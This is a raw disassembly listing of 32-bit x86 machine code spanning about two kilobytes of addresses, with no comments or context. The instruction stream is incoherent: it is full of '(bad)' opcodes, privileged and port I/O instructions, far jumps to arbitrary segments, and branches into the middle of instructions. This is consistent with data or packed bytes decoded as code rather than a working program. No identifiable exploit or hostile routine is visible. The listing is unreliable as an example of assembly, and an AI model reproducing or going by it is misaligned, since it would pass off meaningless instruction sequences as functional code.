  40fdcf:	mov    DWORD PTR [ebp+0x3916724c],0x695e768a
  40fdd9:	mov    ah,0x6f
  40fddb:	cdq    
  40fddc:	sti    
  40fddd:	add    DWORD PTR [ecx+0x25e2bbbf],edx
  40fde3:	inc    ebx
  40fde4:	mov    ?,WORD PTR [edi+0x55]
  40fde7:	mov    dh,0x33
  40fde9:	mov    ecx,0xc0afa59
  40fdee:	pop    ss
  40fdef:	pop    ebp
  40fdf0:	xchg   edx,eax
  40fdf1:	sahf   
  40fdf2:	mov    al,ds:0x1c14cf36
  40fdf7:	inc    DWORD PTR [eax]
  40fdf9:	leave  
  40fdfa:	dec    esi
  40fdfb:	push   edi
  40fdfc:	push   ds
  40fdfd:	cwde   
  40fdfe:	inc    edx
  40fdff:	in     eax,dx
  40fe00:	jae    0x40fd9e
  40fe02:	sbb    BYTE PTR [edi],dl
  40fe04:	sub    ebp,DWORD PTR [edi+0x23]
  40fe07:	fmul   QWORD PTR [edi*8+0x2a836bef]
  40fe0e:	cdq    
  40fe0f:	push   ecx
  40fe10:	stos   DWORD PTR es:[edi],eax
  40fe11:	test   eax,0x361fc378
  40fe16:	pop    DWORD PTR [ecx]
  40fe18:	popa   
  40fe19:	into   
  40fe1a:	lock or BYTE PTR [ecx+0x5b],dl
  40fe1e:	cmp    al,0xe8
  40fe20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe21:	ins    BYTE PTR es:[edi],dx
  40fe22:	dec    edx
  40fe23:	cmp    BYTE PTR [ebx+0x56],dh
  40fe26:	inc    ebp
  40fe27:	adc    esi,DWORD PTR [edi]
  40fe29:	ret    0x8539
  40fe2c:	mov    al,0xa
  40fe2e:	cmp    eax,edi
  40fe30:	call   0x3304:0x287f67ea
  40fe37:	sbb    BYTE PTR [ebx-0x7fffcb4b],bl
  40fe3d:	idiv   BYTE PTR [ebx]
  40fe3f:	fsubr  DWORD PTR [ecx]
  40fe41:	outs   dx,BYTE PTR ds:[esi]
  40fe42:	jb     0x40fe98
  40fe44:	cdq    
  40fe45:	rcr    BYTE PTR [ebp+0x76d3bad0],1
  40fe4b:	les    edi,FWORD PTR ds:0xfe3793b
  40fe51:	adc    edx,ebp
  40fe53:	adc    al,BYTE PTR [edx+0x25]
  40fe56:	dec    edx
  40fe57:	mov    ebp,0x1facdac3
  40fe5c:	imul   bh
  40fe5e:	mov    ch,0x28
  40fe60:	retf   0xc5a2
  40fe63:	mov    dh,0xe2
  40fe65:	test   BYTE PTR [ebx+0x3],bl
  40fe68:	scas   al,BYTE PTR es:[edi]
  40fe69:	out    0xf,al
  40fe6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6c:	xor    eax,0x1da0a296
  40fe71:	out    dx,al
  40fe72:	and    eax,0x1e902b6b
  40fe77:	es xchg esi,eax
  40fe79:	jo     0x40feb0
  40fe7b:	cwde   
  40fe7c:	push   ecx
  40fe7d:	int3   
  40fe7e:	and    BYTE PTR [eax],bl
  40fe80:	into   
  40fe81:	shl    BYTE PTR [ebp-0xd],1
  40fe84:	rol    ebx,cl
  40fe86:	(bad)  
  40fe87:	and    ecx,DWORD PTR [eax+0x74a960bd]
  40fe8d:	jecxz  0x40fe38
  40fe8f:	xchg   esi,eax
  40fe90:	xchg   edi,eax
  40fe91:	ret    0x70e
  40fe94:	cmp    ebx,DWORD PTR [ecx+0x1b]
  40fe97:	jg     0x40fe8d
  40fe99:	(bad)  
  40fe9a:	and    BYTE PTR [edx-0x58],ch
  40fe9d:	mov    ch,BYTE PTR [ebp+0x63eeecbb]
  40fea3:	daa    
  40fea4:	mov    ?,esp
  40fea6:	lods   eax,DWORD PTR ds:[esi]
  40fea7:	or     al,0xa3
  40fea9:	pop    ecx
  40feaa:	or     DWORD PTR [edx-0x748e8f8a],ebx
  40feb0:	xchg   esp,eax
  40feb1:	fcmovne st,st(1)
  40feb3:	out    0xb3,al
  40feb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb6:	inc    eax
  40feb7:	sub    DWORD PTR [edx-0x5c],edx
  40feba:	out    0x4c,al
  40febc:	sbb    ch,BYTE PTR [esp+ebp*2+0x25]
  40fec0:	out    0x18,al
  40fec2:	mov    DWORD PTR [ecx+eax*1+0x1c966843],eax
  40fec9:	xor    BYTE PTR [eax-0x7f],0x8
  40fecd:	xchg   edx,eax
  40fece:	ja     0x40ff00
  40fed0:	pop    ebp
  40fed1:	je     0x40fe56
  40fed3:	lea    eax,[ecx+0x54]
  40fed6:	lea    edi,[eax+0x4470324e]
  40fedc:	sub    BYTE PTR [esi-0x1e],bl
  40fedf:	sbb    cl,BYTE PTR [edx-0x10]
  40fee2:	loop   0x40ff0d
  40fee4:	imul   eax,edx,0xffffffb2
  40fee7:	jmp    0x562a4441
  40feec:	sbb    BYTE PTR [edi-0x72],ah
  40feef:	cmp    BYTE PTR [ebp+0x95f4905],dh
  40fef5:	imul   esi,DWORD PTR [edx+edi*4+0x4e],0x8e83bd8c
  40fefd:	jae    0x40ff00
  40feff:	js     0x40fe97
  40ff01:	ja     0x40feea
  40ff03:	or     esp,ebx
  40ff05:	fisubr WORD PTR [ebx+ebx*1+0x5d46d065]
  40ff0c:	push   cs
  40ff0d:	xchg   edx,eax
  40ff0e:	ins    BYTE PTR es:[edi],dx
  40ff0f:	std    
  40ff10:	loop   0x40ff75
  40ff12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff13:	mov    DWORD PTR [ebx],0xb23e7e04
  40ff19:	cmp    al,0x6b
  40ff1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff1c:	fwait
  40ff1d:	xchg   esp,eax
  40ff1e:	push   ebp
  40ff1f:	lock int 0xcb
  40ff22:	aad    0x2a
  40ff24:	adc    BYTE PTR [edx+0x7d2fd533],cl
  40ff2a:	mov    ebp,ecx
  40ff2c:	sub    DWORD PTR [ecx+edx*8+0x6f],ecx
  40ff30:	and    dl,BYTE PTR [ebx]
  40ff32:	jb     0x40ffa7
  40ff34:	es retf 
  40ff36:	mov    cl,0x86
  40ff38:	jge    0x40febd
  40ff3a:	and    DWORD PTR [ecx+0x2f],ecx
  40ff3d:	pop    DWORD PTR fs:[ecx-0x6646f976]
  40ff44:	and    DWORD PTR [ebx+0x3a],esp
  40ff47:	mov    cl,0x5a
  40ff49:	or     eax,0x32bf1ecc
  40ff4e:	lahf   
  40ff4f:	sbb    al,BYTE PTR [esi-0x49]
  40ff52:	arpl   cx,di
  40ff54:	(bad)
  40ff57:	push   es
  40ff58:	sub    BYTE PTR [esi+0x665b71c6],al
  40ff5e:	add    eax,0x3e0d95a1
  40ff63:	shl    DWORD PTR [edi+edi*2+0x4bad9637],1
  40ff6a:	lahf   
  40ff6b:	loop   0x40ffaa
  40ff6d:	call   0xd9b3:0x5a435fab
  40ff74:	push   0xa8688d46
  40ff79:	iret   
  40ff7a:	mov    DWORD PTR [ebp-0x7d],ecx
  40ff7d:	mov    ds:0x5424bb23,al
  40ff82:	into   
  40ff83:	fnsave [bx-0x35f5]
  40ff88:	xchg   edi,eax
  40ff89:	dec    ebp
  40ff8a:	mov    DWORD PTR [ebx],esi
  40ff8c:	and    al,0xe7
  40ff8e:	(bad)  
  40ff8f:	or     DWORD PTR [di],0x1
  40ff93:	jecxz  0x40ff6c
  40ff95:	mov    esi,0xa9a86d6d
  40ff9a:	push   ebx
  40ff9b:	(bad)
  40ff9f:	inc    edx
  40ffa0:	xchg   BYTE PTR [ecx+0x63],bl
  40ffa3:	les    esi,FWORD PTR [ebp-0x2d]
  40ffa6:	or     BYTE PTR [ecx-0x62],al
  40ffa9:	loopne 0x40ffbf
  40ffab:	in     eax,dx
  40ffac:	add    eax,0x7b62d0d2
  40ffb1:	fwait
  40ffb2:	sub    eax,0x6044bdd0
  40ffb7:	or     ebp,DWORD PTR [eax]
  40ffb9:	and    ch,0xc1
  40ffbc:	jp     0x40ffac
  40ffbe:	out    dx,al
  40ffbf:	clc    
  40ffc0:	mov    ebx,0x8f4f89c6
  40ffc5:	sub    DWORD PTR [ebx+0x64],esp
  40ffc8:	mov    esp,0x474a2f6a
  40ffcd:	mov    ch,0xfe
  40ffcf:	data16 fild DWORD PTR [eax-0x2d64d2e7]
  40ffd6:	das    
  40ffd7:	popa   
  40ffd8:	jmp    0x1e20:0x8d39d41b
  40ffdf:	das    
  40ffe0:	jo     0x40ff62
  40ffe2:	jb     0x410056
  40ffe4:	mov    BYTE PTR [ebx-0x29380c99],cl
  40ffea:	(bad)  
  40ffeb:	adc    DWORD PTR [edi+0x590d5738],esi
  40fff1:	int    0x5
  40fff3:	add    al,0x1b
  40fff5:	jae    0x410029
  40fff7:	cwde   
  40fff8:	imul   eax,DWORD PTR [esi+esi*8],0xda4e35ad
  40ffff:	mov    DWORD PTR [ecx],ebp
  410001:	out    0xf1,eax
  410003:	rol    DWORD PTR [edi],cl
  410005:	jns    0x410012
  410007:	or     esp,edx
  410009:	and    DWORD PTR [ebp-0x5],ebp
  41000c:	icebp  
  41000d:	aaa    
  41000e:	ins    DWORD PTR es:[edi],dx
  41000f:	xchg   ebx,eax
  410010:	out    0x6d,al
  410012:	mov    edi,edi
  410014:	into   
  410015:	nop
  410016:	xchg   esp,eax
  410017:	jg     0x40ffe4
  410019:	sbb    DWORD PTR [edi-0x3c77df42],esp
  41001f:	lock or cl,ch
  410022:	xor    eax,0xa5d4be77
  410027:	xor    ch,ah
  410029:	iret   
  41002a:	test   BYTE PTR [eax+0x50],al
  41002d:	pop    ebx
  41002e:	sub    BYTE PTR [ebx+0x286e107b],cl
  410034:	lods   eax,DWORD PTR ds:[esi]
  410035:	inc    esp
  410036:	ja     0x410093
  410038:	cmp    DWORD PTR [eax-0x20fc50ab],edx
  41003e:	pop    ss
  41003f:	pop    ss
  410040:	jae    0x410008
  410042:	sbb    DWORD PTR [ecx-0x309a8f10],ecx
  410048:	lfs    edi,FWORD PTR [esp+edi*1+0x3308cf61]
  410050:	fist   WORD PTR [ebp+0x69]
  410053:	imul   eax,DWORD PTR [edx],0x110446c3
  410059:	not    BYTE PTR [ebp+0x570aba3d]
  41005f:	stos   BYTE PTR es:[edi],al
  410060:	enter  0x38aa,0x1a
  410064:	inc    edi
  410065:	xchg   ecx,eax
  410066:	dec    ebx
  410067:	repnz aas 
  410069:	fimul  WORD PTR [ebp-0x37]
  41006c:	sub    ch,BYTE PTR [esi-0x3c]
  41006f:	mov    cl,0x89
  410071:	pop    ecx
  410072:	les    edx,FWORD PTR [ebx]
  410074:	xchg   esp,eax
  410075:	jg     0x4100a1
  410077:	(bad)  
  410078:	fidiv  DWORD PTR [edi+0x10]
  41007b:	pushf  
  41007c:	mov    al,cs:0xd4a3e70e
  410082:	arpl   WORD PTR [edi+esi*1],di
  410085:	int3   
  410086:	imul   ebx,DWORD PTR [ebx-0x67],0x1
  41008a:	(bad)  
  41008b:	and    al,0x2
  41008d:	push   edi
  41008e:	clc    
  41008f:	mov    esp,0xd9a35956
  410094:	imul   edi,DWORD PTR [edi],0x618e5d9a
  41009a:	and    al,0xf5
  41009c:	ins    DWORD PTR es:[edi],dx
  41009d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41009e:	out    0x6c,eax
  4100a0:	mov    bh,0xda
  4100a2:	jle    0x4100bb
  4100a4:	cld    
  4100a5:	xchg   esi,eax
  4100a6:	push   edx
  4100a7:	sbb    esi,DWORD PTR [edx]
  4100a9:	adc    cl,BYTE PTR [esi-0x79]
  4100ac:	scas   eax,DWORD PTR es:[edi]
  4100ad:	aaa    
  4100ae:	mov    eax,ds:0x6d5c5d7e
  4100b3:	loop   0x4100a9
  4100b5:	inc    edi
  4100b6:	test   DWORD PTR [esi],esp
  4100b8:	pop    esi
  4100b9:	pushf  
  4100ba:	push   eax
  4100bb:	add    DWORD PTR ds:0x5987c64e,esp
  4100c1:	mov    esp,0xf31269b4
  4100c6:	add    eax,0x9f2da82
  4100cb:	out    dx,eax
  4100cc:	jno    0x410055
  4100ce:	pop    ds
  4100cf:	fld    DWORD PTR [eax]
  4100d1:	or     ch,bl
  4100d3:	out    0x14,eax
  4100d5:	add    al,ah
  4100d7:	mov    ds,WORD PTR [esi]
  4100d9:	push   0xea1d4b21
  4100de:	les    edx,FWORD PTR [eax-0x80]
  4100e1:	pusha  
  4100e2:	mov    DWORD PTR [esi],0xf813387d
  4100e8:	jp     0x41007c
  4100ea:	add    BYTE PTR [edx],bl
  4100ec:	mov    ds:0xfb5fff5e,al
  4100f1:	sahf   
  4100f2:	mov    cl,0xc3
  4100f4:	mov    edx,0xe185e940
  4100f9:	sti    
  4100fa:	xor    al,0xb7
  4100fc:	xor    al,0x5c
  4100fe:	add    eax,0x424d2179
  410103:	mov    es,edi
  410105:	fldcw  WORD PTR [ebx+0x62]
  410108:	mov    ecx,0xfd55543c
  41010d:	xor    DWORD PTR [edi-0x1a],edx
  410110:	xchg   edx,eax
  410111:	add    bl,cl
  410113:	mov    al,BYTE PTR [edi]
  410115:	push   edi
  410116:	sar    BYTE PTR [ecx+0x46bc9bf3],cl
  41011c:	xchg   esp,eax
  41011d:	(bad)  
  41011e:	jbe    0x4100d1
  410120:	dec    edx
  410121:	xchg   ebx,eax
  410122:	fwait
  410123:	stos   BYTE PTR es:[edi],al
  410124:	out    dx,al
  410125:	aad    0x4d
  410127:	push   es
  410128:	and    ecx,DWORD PTR [ecx+edx*4-0x2c]
  41012c:	inc    esp
  41012d:	push   ebp
  41012e:	icebp  
  41012f:	scas   al,BYTE PTR es:[edi]
  410130:	sbb    DWORD PTR cs:[ecx],0x36
  410134:	call   0xd0bb63ac
  410139:	rcr    BYTE PTR [edx-0xefa96ae],cl
  41013f:	jmp    0x4100f3
  410141:	jnp    0x410171
  410143:	rol    BYTE PTR [edi+0x633d0b70],cl
  410149:	dec    eax
  41014a:	out    dx,eax
  41014b:	fwait
  41014c:	xchg   DWORD PTR [edi],esp
  41014e:	(bad)  
  41014f:	mov    ebp,0xcc69efc1
  410154:	cmp    dh,bl
  410156:	scas   al,BYTE PTR es:[edi]
  410157:	aas    
  410158:	imul   ebx,DWORD PTR [edi+0x1f1ee84c],0xffffff89
  41015f:	mov    ecx,0x5f94237f
  410164:	fst    QWORD PTR [edi+eiz*2-0x1e]
  410168:	inc    edx
  410169:	mov    BYTE PTR [eiz*2-0x93da478],al
  410170:	lahf   
  410171:	xor    BYTE PTR [edi+0x4e],bl
  410174:	and    al,BYTE PTR [ebx]
  410176:	mul    ch
  410178:	repz jo 0x410196
  41017b:	push   0x3083d074
  410180:	mov    dh,0x7b
  410182:	(bad)  
  410183:	in     al,dx
  410184:	imul   edx,DWORD PTR [edx-0x19432114],0x71
  41018b:	aaa    
  41018c:	popf   
  41018d:	js     0x410163
  41018f:	ds js  0x410169
  410192:	jb     0x410147
  410194:	div    DWORD PTR [ecx]
  410196:	scas   eax,DWORD PTR es:[edi]
  410197:	enter  0x6be,0xba
  41019b:	shr    eax,cl
  41019d:	into   
  41019e:	push   cs
  41019f:	popf   
  4101a0:	in     al,0x84
  4101a2:	nop
  4101a3:	sub    DWORD PTR [ebx],ecx
  4101a5:	ins    BYTE PTR es:[edi],dx
  4101a6:	sub    DWORD PTR es:[edi-0x55],0x4c
  4101ab:	ss cwde 
  4101ad:	sub    BYTE PTR [edi-0x4c01cf25],al
  4101b3:	inc    ecx
  4101b4:	or     DWORD PTR ss:[ecx-0x6b],esp
  4101b8:	out    0xe9,eax
  4101ba:	sub    bl,BYTE PTR [edi]
  4101bc:	xchg   edi,eax
  4101bd:	popf   
  4101be:	addr16 retf 0x6ba9
  4101c2:	fisttp WORD PTR [eax+0x71]
  4101c5:	jmp    0x6084:0x5f4cde5
  4101cc:	outs   dx,BYTE PTR ds:[esi]
  4101cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ce:	addr16 (bad) 
  4101d0:	(bad)  
  4101d1:	sti    
  4101d2:	scas   eax,DWORD PTR es:[edi]
  4101d3:	(bad)  
  4101d4:	call   0xb1d007ad
  4101d9:	aas    
  4101da:	sbb    ecx,DWORD PTR [ebp+0x56]
  4101dd:	xor    DWORD PTR [eax-0x45650f74],ebp
  4101e3:	out    0xd2,al
  4101e5:	xor    edx,esi
  4101e7:	or     esi,ebp
  4101e9:	sub    DWORD PTR [ebp+0x56],edi
  4101ec:	sbb    eax,0x6a460590
  4101f1:	stos   DWORD PTR es:[edi],eax
  4101f2:	pusha  
  4101f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101f4:	pop    es
  4101f5:	ret    0xfd3f
  4101f8:	or     ch,dh
  4101fa:	and    DWORD PTR [ebp+0x7331aec5],edx
  410200:	jo     0x4101f5
  410202:	pop    edx
  410203:	xor    esp,DWORD PTR [esi]
  410205:	stos   BYTE PTR es:[edi],al
  410206:	or     DWORD PTR [ecx+0x41],edx
  410209:	aas    
  41020a:	adc    eax,0x6baf2ee9
  41020f:	dec    ecx
  410210:	push   edx
  410211:	or     BYTE PTR [ebp-0x29],bh
  410214:	int3   
  410215:	adc    dl,dh
  410217:	xchg   ebp,eax
  410218:	mov    BYTE PTR [ebp-0x1cfbeb6f],0xc6
  41021f:	gs mov ah,0x7f
  410222:	dec    ebp
  410223:	scas   al,BYTE PTR es:[edi]
  410224:	jno    0x4101b2
  410226:	xchg   esp,eax
  410227:	sub    DWORD PTR [ebp+0xeb4aadb],esi
  41022d:	push   ecx
  41022e:	dec    eax
  41022f:	jnp    0x410258
  410231:	pop    eax
  410232:	out    0xd1,al
  410234:	fild   WORD PTR [eax]
  410236:	sbb    DWORD PTR [eax-0x5104c08d],ebp
  41023c:	push   esi
  41023d:	mov    al,ds:0x49c67907
  410243:	or     al,BYTE PTR [edx]
  410245:	popf   
  410246:	or     DWORD PTR [esi+0x5c4f7735],0x24
  41024d:	push   cs
  41024e:	sub    al,BYTE PTR [eax-0x6ed418b8]
  410254:	outs   dx,BYTE PTR ds:[esi]
  410255:	xor    ebp,0xccd5ce8d
  41025b:	xchg   ebp,eax
  41025c:	(bad)  
  41025d:	adc    al,0x74
  41025f:	inc    eax
  410260:	mov    eax,0x260cdbdb
  410265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410266:	pop    ss
  410267:	fs int 0x94
  41026a:	and    DWORD PTR ds:0xe8bb42c5,esi
  410270:	cmp    BYTE PTR [edi+0x78],ch
  410273:	pop    es
  410274:	add    bh,BYTE PTR [ecx-0x42fdc171]
  41027a:	leave  
  41027b:	in     al,dx
  41027c:	push   0xfffffff6
  41027e:	fiadd  WORD PTR ds:0xd2087a7
  410284:	push   ebx
  410285:	js     0x410297
  410287:	call   0xd8f2:0x92dcca95
  41028e:	mov    gs,WORD PTR [eax-0x4afa229d]
  410294:	shl    DWORD PTR [ebp+eiz*8+0x6d0abf4],1
  41029b:	xor    eax,0xcc959d34
  4102a0:	fild   DWORD PTR [eax]
  4102a2:	or     cl,BYTE PTR [edx+0x2e91b439]
  4102a8:	mov    bl,0x60
  4102aa:	mov    edi,0x3b565a58
  4102af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b0:	test   ebx,ebx
  4102b2:	sbb    DWORD PTR [ecx-0x6fcf661c],ecx
  4102b8:	sub    esp,DWORD PTR [ecx]
  4102ba:	cli    
  4102bb:	in     eax,dx
  4102bc:	loopne 0x41024b
  4102be:	pop    ebp
  4102bf:	lock sbb eax,0x941a22dc
  4102c5:	jecxz  0x4102f0
  4102c7:	sbb    BYTE PTR [esi-0x8],ch
  4102ca:	test   eax,0xd150e58b
  4102cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102d0:	xchg   ebx,eax
  4102d1:	or     eax,0x311f23df
  4102d6:	sbb    DWORD PTR [ebx+ecx*2-0x5c403337],esi
  4102dd:	outs   dx,DWORD PTR ds:[esi]
  4102de:	stos   BYTE PTR es:[edi],al
  4102df:	sbb    ah,al
  4102e1:	popf   
  4102e2:	and    BYTE PTR [eax+edx*2],bl
  4102e5:	adc    eax,0xf5824e6d
  4102ea:	mov    ds:0x636a44e6,eax
  4102ef:	data16 outs dx,BYTE PTR ds:[esi]
  4102f1:	leave  
  4102f2:	add    DWORD PTR [bp+0x12],ecx
  4102f6:	adc    al,0xc2
  4102f8:	push   edi
  4102f9:	adc    eax,0x70a2b6b3
  4102fe:	push   cs
  4102ff:	ficomp WORD PTR [edx-0x28]
  410302:	es jb  0x410372
  410305:	lods   eax,DWORD PTR ds:[esi]
  410306:	(bad)  
  410307:	(bad)  
  410309:	pop    ecx
  41030a:	push   0x22339c5b
  41030f:	test   BYTE PTR [ebx+0x264bcb20],al
  410315:	cmp    BYTE PTR [edx+0x5b4a5658],0xa8
  41031c:	out    dx,eax
  41031d:	xchg   ebx,eax
  41031e:	iret   
  41031f:	ins    BYTE PTR es:[edi],dx
  410320:	or     BYTE PTR [ebx],cl
  410322:	push   edi
  410323:	repnz adc DWORD PTR [ebp+0x2a],ecx
  410327:	mov    ebx,0x8369ec35
  41032c:	(bad)  
  41032d:	fwait
  41032e:	sub    DWORD PTR ds:0xe4535ded,esp
  410334:	jge    0x41038e
  410336:	icebp  
  410337:	xlat   BYTE PTR ds:[ebx]
  410338:	js     0x4102c4
  41033a:	retf   0x1569
  41033d:	loop   0x410317
  41033f:	push   0xe
  410341:	add    BYTE PTR [esi+0x6a47bba],0x57
  410348:	pop    esi
  410349:	mov    edi,0x5ee95817
  41034e:	xchg   edx,eax
  41034f:	retf   0x1615
  410352:	stos   BYTE PTR es:[edi],al
  410353:	jno    0x41032c
  410355:	jns    0x41031f
  410357:	adc    al,0xe9
  410359:	sbb    eax,DWORD PTR [ebx+edi*1]
  41035c:	dec    DWORD PTR [esi]
  41035e:	add    eax,0x1288a260
  410363:	push   esi
  410364:	add    al,0x39
  410366:	and    al,0x14
  410368:	popf   
  410369:	xchg   DWORD PTR [esi-0x44],eax
  41036c:	aaa    
  41036d:	lock mov eax,0x53506a40
  410373:	movsx  esi,BYTE PTR [ecx+0x50]
  410377:	push   cs
  410378:	jb     0x41035a
  41037a:	and    edi,edx
  41037c:	(bad)  
  41037d:	dec    eax
  41037e:	push   esp
  41037f:	inc    ebx
  410380:	shl    DWORD PTR [esi],cl
  410382:	daa    
  410383:	mov    es,WORD PTR [ecx]
  410385:	das    
  410386:	jns    0x4103d4
  410388:	jg     0x41030a
  41038a:	cmpxchg BYTE PTR [ecx],dh
  41038d:	jecxz  0x4103a3
  41038f:	repnz adc esi,DWORD PTR [edx+0x1e]
  410393:	stos   BYTE PTR es:[edi],al
  410394:	stos   BYTE PTR es:[edi],al
  410395:	push   esi
  410396:	adc    BYTE PTR [esp+esi*1+0x16],dl
  41039a:	mov    BYTE PTR [ebp+0x55],al
  41039d:	mov    edx,0xe8c6d018
  4103a2:	sub    DWORD PTR [ebp-0x7850bc3f],esi
  4103a8:	sub    al,0xb4
  4103aa:	or     DWORD PTR [esi],esp
  4103ac:	xor    DWORD PTR [ecx],eax
  4103ae:	and    dl,BYTE PTR [esi+0x53075ea5]
  4103b4:	adc    dl,dl
  4103b6:	es pushf 
  4103b8:	retf   
  4103b9:	jmp    0xd481:0xa45f1a86
  4103c0:	or     DWORD PTR [edi],0x14844c56
  4103c6:	test   eax,0xfdbd7bf7
  4103cb:	xor    ebx,DWORD PTR [ebx+0x4fd5bf9f]
  4103d1:	dec    edx
  4103d2:	jmp    0x4103ab
  4103d4:	ins    DWORD PTR es:[edi],dx
  4103d5:	out    dx,eax
  4103d6:	jae    0x4103d6
  4103d8:	leave  
  4103d9:	sbb    DWORD PTR [ebx+0x6f],ecx
  4103dc:	lods   eax,DWORD PTR ds:[esi]
  4103dd:	test   DWORD PTR [eax-0x6f],edx
  4103e0:	jmp    FWORD PTR [eax]
  4103e2:	xor    bh,BYTE PTR [ebx-0x22b50ef7]
  4103e8:	fisub  DWORD PTR [edx]
  4103ea:	pop    ebx
  4103eb:	push   esp
  4103ec:	iret   
  4103ed:	ror    BYTE PTR [esi+0x163e6eb6],0x3c
  4103f4:	fs repnz nop
  4103f7:	(bad)  
  4103f8:	add    al,0xcb
  4103fa:	cmp    BYTE PTR [edi],0x19
  4103fd:	(bad)  [ecx+edx*8-0x5be00245]
  410404:	rcl    BYTE PTR [ebp+0x509fd948],cl
  41040a:	inc    esi
  41040b:	loopne 0x41045f
  41040d:	dec    eax
  41040e:	jbe    0x4103cc
  410410:	xchg   esp,eax
  410411:	push   esi
  410412:	add    WORD PTR [eax],sp
  410415:	pusha  
  410416:	or     eax,0xfa773150
  41041b:	inc    edx
  41041c:	cli    
  41041d:	je     0x4103bf
  41041f:	call   0xc4a067e4
  410424:	dec    edi
  410425:	pop    edi
  410426:	mov    BYTE PTR [edi-0x1f467f94],dl
  41042c:	add    ebx,DWORD PTR [edi+0x1b3dc311]
  410432:	or     DWORD PTR [eax+0x65be49a9],ecx
  410438:	sub    edx,DWORD PTR [ecx]
  41043a:	adc    ebp,ecx
  41043c:	dec    ebx
  41043d:	mov    DWORD PTR [edi-0x6a],edi
  410440:	and    al,0xfb
  410442:	add    BYTE PTR [ecx+0x64],bl
  410445:	in     eax,dx
  410446:	xor    ebp,DWORD PTR [ebx]
  410448:	and    ah,BYTE PTR [ebx-0x66]
  41044b:	es jp  0x41045d
  41044e:	jbe    0x41044e
  410450:	ss mov ebp,0x202f5d5c
  410456:	sbb    DWORD PTR ds:0xae4376a,ecx
  41045c:	inc    edx
  41045d:	push   esi
  41045e:	jle    0x4103f6
  410460:	pop    ecx
  410461:	nop
  410462:	icebp  
  410463:	sub    eax,0x4c319801
  410468:	icebp  
  410469:	das    
  41046a:	stos   DWORD PTR es:[edi],eax
  41046b:	std    
  41046c:	leave  
  41046d:	jge    0x41042c
  41046f:	enter  0xcde2,0x14
  410473:	and    eax,0x35791f4b
  410478:	dec    edx
  410479:	adc    eax,0x97fd5f96
  41047e:	or     DWORD PTR [ebx+0x4617143b],0x59
  410485:	std    
  410486:	cli    
  410487:	in     eax,0xb0
  410489:	vmwrite ebx,DWORD PTR [edx]
  41048c:	jmp    0xe726a668
  410491:	sub    BYTE PTR [ebx+0x19fed197],dh
  410497:	ja     0x410499
	...
  410511:	add    BYTE PTR [eax],al
  410513:	add    BYTE PTR [ebp+0x6b],ah
  410516:	sub    edi,0xffffff8f
  410519:	out    dx,eax
  41051a:	ins    DWORD PTR es:[edi],dx
  41051b:	jmp    0x410577
  41051d:	sar    ecx,cl
  41051f:	sbb    edi,DWORD PTR [ebx+ebx*2+0x34]
  410523:	dec    eax
  410524:	gs mov al,0x0
  410527:	add    BYTE PTR [edi+eax*1+0x0],ch
  41052b:	add    BYTE PTR [esi-0x3da0d353],bl
  410531:	jge    0x41057f
  410533:	mov    ebx,0x24e4893
  410538:	add    eax,0xa9ab5378
  41053d:	push   edi
  41053e:	cwde   
  41053f:	aas    
  410540:	pop    ss
  410541:	pop    es
  410542:	sub    al,0xf3
  410544:	(bad)  
  410545:	jle    0x4105c1
  410547:	adc    ebp,DWORD PTR [ebp-0x31]
  41054a:	mov    edi,0x6be77e4e
  41054f:	jns    0x4105a0
  410551:	aaa    
  410552:	mov    BYTE PTR [ebp-0x5ef43a2a],bh
  410558:	sahf   
  410559:	test   BYTE PTR [edx],bl
  41055b:	xchg   esp,eax
  41055c:	jnp    0x410593
  41055e:	jmp    0xf7abd1b8
  410563:	pushf  
  410564:	jmp    0x1fa9c759
  410569:	and    eax,0xd7f543f6
  41056e:	jns    0x410548
  410570:	shl    DWORD PTR [ecx],0x62
  410573:	js     0x410598
  410575:	inc    ebp
  410576:	add    ah,bl
  410578:	mov    ecx,0xdf1b377d
  41057d:	scas   eax,DWORD PTR es:[edi]
  41057e:	out    0x62,al
  410580:	or     eax,DWORD PTR [edi]
  410582:	cli    
  410583:	imul   esp,DWORD PTR [ebx],0xa861a26d
  410589:	pop    edx
  41058a:	lods   al,BYTE PTR ds:[esi]
  41058b:	lock loopne 0x410550
  41058e:	push   ecx
  41058f:	loop   0x4105ba
  410591:	mov    bh,0x9
  410593:	dec    esp
  410594:	enter  0xfeae,0x2a
  410598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410599:	in     eax,dx
  41059a:	mov    ebx,0xa4fdb92c
  41059f:	test   BYTE PTR [ebp-0x43f4543f],ch
  4105a5:	lds    edx,FWORD PTR [ebx]
  4105a7:	mov    WORD PTR [ecx+0x17],ds
  4105aa:	cmc    
  4105ab:	push   ecx
  4105ac:	cmp    BYTE PTR [esi+0x5feb1c80],ch
  4105b2:	test   al,0x82
  4105b4:	jmp    0x466b:0xff837042
  4105bb:	retf   
  4105bc:	mov    ecx,0xecad6a07
  4105c1:	inc    ebp
  4105c2:	push   edi
  4105c3:	stos   DWORD PTR es:[edi],eax
  4105c4:	inc    ebp
  4105c5:	daa    
  4105c6:	inc    ebp
  4105c7:	fnstsw WORD PTR [ecx-0x8]
  4105ca:	sahf   
  4105cb:	gs xchg ebp,eax
  4105cd:	fsubr  DWORD PTR [ebx]
  4105cf:	and    esi,0x566f1331
  4105d5:	and    BYTE PTR [esi-0x3e97d823],bh
  4105db:	xchg   esi,eax
  4105dc:	dec    esi
  4105dd:	push   ecx
  4105de:	int    0xc4
  4105e0:	cld    
  4105e1:	push   ds
  4105e2:	or     esi,DWORD PTR [ebp+0x6]
  4105e5:	mov    esi,0xca75881b
  4105ea:	pop    ss
  4105eb:	out    dx,eax
  4105ec:	jo     0x410604
  4105ee:	pop    edi
  4105ef:	mov    edx,0x9bb8f795
  4105f4:	mov    dh,0xfe
  4105f6:	cmp    eax,0xb1b2e04e
  4105fb:	inc    edi
  4105fc:	sbb    BYTE PTR [edx],al
